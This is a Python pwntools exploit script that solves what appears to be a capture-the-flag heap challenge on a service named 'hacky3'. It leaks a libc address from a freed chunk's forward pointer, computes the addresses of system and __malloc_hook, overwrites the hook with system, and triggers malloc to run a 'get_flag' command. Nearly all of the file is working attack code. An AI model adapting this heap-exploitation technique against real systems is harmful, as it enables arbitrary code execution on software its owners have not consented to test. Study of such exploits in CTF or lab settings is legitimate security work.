#!/usr/bin/python3

#import libraries
import sys
#get some pwn stuff into global namespace
from pwn import p64, sleep, remote, context
#disable annoying pwntools log messages (e.g. info regarding opened/closed connection)
context.log_level = 'error'

#set host and port to connect to
host = "hacky3"
port = 13719
if len(sys.argv) >= 2:
    host = sys.argv[1]
if len(sys.argv) >= 3:
    port = int(sys.argv[2])

manual_step_mode = False

#This is where the exploit lives.
def exploit():
    proc = remote(host, port, fam="ipv4")
    
    offset_libc_memalign_hook = 0x7c420
    #offset_libc_execve = 0xb8640
    offset_libc_system = 0x3f480

    print("(-) Allocating chunk 1 of size 0xa0.")
    if manual_step_mode: input()
    proc.readuntil(b"> ")
    proc.write(b"1\n")
    proc.readuntil(b"size: ")
    proc.write(b"0x90\n")
    addr_first_allocated_chunk = int(proc.readuntil(b"\n")[2:14], 16)
    print(f"    chunk 1 address: {addr_first_allocated_chunk:#0{0}18x}")

    print("(-) Allocating chunk 2 of size 0xa0.")
    if manual_step_mode: input()
    proc.readuntil(b"> ")
    proc.write(b"1\n")
    proc.readuntil(b"size: ")
    proc.write(b"0x90\n")
    addr_second_allocated_chunk = int(proc.readuntil(b"\n")[2:14], 16)
    print(f"    chunk 2 address: {addr_second_allocated_chunk:#0{0}18x}")

    print("(-) Allocating chunk 3 of size 0xa0.")
    if manual_step_mode: input()
    proc.readuntil(b"> ")
    proc.write(b"1\n")
    proc.readuntil(b"size: ")
    proc.write(b"0x90\n")
    addr_third_allocated_chunk = int(proc.readuntil(b"\n")[2:14], 16)
    print(f"    chunk 2 address: {addr_third_allocated_chunk:#0{0}18x}")

    print("(-) Freeing chunk 2 of size 0xa0.")
    if manual_step_mode: input()
    proc.readuntil(b"> ")
    proc.write(b"3\n")
    proc.readuntil(b"pointer: ")
    proc.write(hex(addr_second_allocated_chunk).encode() + b"\n")

    print("(-) Printing (freed) chunk 2 of size 0xa0 in order to leak heap's main arena (@libc) via forward pointer.")
    if manual_step_mode: input()
    proc.readuntil(b"> ")
    proc.write(b"8\n")
    proc.readuntil(b"pointer: ")
    proc.write(hex(addr_second_allocated_chunk).encode() + b"\n")
    proc.readuntil(b"length: ")
    proc.write(b"6\n")
    addr_main_arena_leak = proc.readuntil(b"> ")
    if len(addr_main_arena_leak) != 8:
        print("(-) Something went wrong when leaking the main arena...")
        proc.close()
        return
    addr_main_arena_smallbin0xa0 = int.from_bytes(addr_main_arena_leak[0:6], 'little')
    print(f"    leaked address: {addr_main_arena_smallbin0xa0:#0{0}18x}")

    addr_libc_base = addr_main_arena_smallbin0xa0 - 0x399B58
    #addr_libc_execve = addr_libc_base + offset_libc_execve
    addr_libc_system = addr_libc_base + offset_libc_system
    offset_main_arena_malloc_hook_to_smallbin0x90 = 0x68
    addr_main_arena_malloc_hook = addr_main_arena_smallbin0xa0 - offset_main_arena_malloc_hook_to_smallbin0x90
    print(f"(-) Calculated Addresses:")
    print(f"    -> libc start:         {addr_libc_base:#0{0}18x}")
    #print(f"    -> execve@libc:        {addr_libc_execve:#0{0}18x}")
    print(f"    -> system@libc:        {addr_libc_system:#0{0}18x}")
    print(f"    -> __malloc_hook@libc: {addr_main_arena_malloc_hook:#0{0}18x}")

    print(f"(-) Write String b'get_flag\\x00' to memory (heap) at {addr_first_allocated_chunk:#0{0}18x}.")
    if manual_step_mode: input()
    proc.write(b"7\n")
    proc.readuntil(b"pointer: ")
    proc.write(hex(addr_first_allocated_chunk).encode() + b"\n")
    proc.readuntil(b"length: ")
    proc.write(b"9")#15\n")
    proc.write(b"get_flag\x00\n")

    print(f"(-) Write address of system@libc ({addr_libc_system:#0{0}18x}) to __malloc_hook@libc at {addr_main_arena_malloc_hook:#0{0}18x}.")
    if manual_step_mode: input()
    proc.readuntil(b"> ")
    proc.write(b"7\n")
    proc.readuntil(b"pointer: ")
    proc.write(hex(addr_main_arena_malloc_hook).encode() + b"\n")
    proc.readuntil(b"length: ")
    proc.write(b"8\n")
    proc.write(p64(addr_libc_system))

    print(f"(-) Call malloc on heap address conatining string b'get_flag\\x00' ({addr_first_allocated_chunk:#0{0}x}) to invoke system() on it via malloc hook.")
    if manual_step_mode: input()
    proc.readuntil(b"> ")
    proc.write(b"1\n")
    proc.readuntil(b"size: ")
    proc.write(hex(addr_first_allocated_chunk).encode() + b"\n")

    print("(-) Retrieving flag...")
    if manual_step_mode: input()
    flag = proc.readline()
    if b'flag' in flag:
        print(f"(-) Successfully retrieved flag: {flag.decode()}")
    else:
        print("(-) Could not retrieve flag...")

    proc.close()
    return

#Invoke the exploit when the script is executed.
exploit()


